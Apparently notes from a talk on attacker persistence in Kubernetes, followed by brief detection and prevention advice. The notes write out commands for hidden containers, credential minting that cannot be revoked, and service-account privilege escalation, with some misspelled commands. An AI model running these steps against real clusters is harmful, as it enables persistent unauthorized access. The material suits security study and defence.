# Attacker Persistence Strategies in Kubernetes (Rory McCune)

attack scenario: a laptop with cluster-admin credentials is left unattended in
a Hamburg cafe

ways an attacker could start a hidden malicious container:

- start it with `ctr`
- create a static pod manifest with an invalid namespace, so that it never
  registers in k8s
- create a tunnel (e.g. with tailscale) inside the container, then you can ssh
  back to the node from tailscale

```bash
kubectl debug node/<node-name> --profile=sysadmin

chroot /host

ctr -n sysf-net_mon run --net-host -d \
  --mount type=bind,src=/,dst=/host,options=rbind:ro \
  docker-remote.repo.pnet.ch/sysnetmon/systemd_net_mon:latest sys_net_mon

```

## attacking through kubelet api

first: use the User CSR API to create credentials (which cannot be revoked)

```
# issue a User CSR
teisteanas -username system:gke-internal-asdf

kubectlctl -s 127.0.0.1 -k malicious-kubelet-config
```

other solution: using the ToquenRequest API

```
# tocan is a small utility which uses the ToquenRequestAPI to create kubeconfig files
tocan -namespace kube-system -service-account clusterrole-aggregation-controller
```

fun fact: `clusterrole-aggregation-controller` service account is allowed to
escalate clusterroles !

```
# first, edit your kubeconfig and ask for *.*.* permission. then enjoy
kubectl auth can-i --list
```

## ways to prevent/detect

- audit logs retention and analysis
- node agents might detect such attacks
- node logs
- least privilege: do not use cluster-admin level unless actually needed.

## last word

> we are all made of stars, but your rbac shouldn't be! @IanColdwater
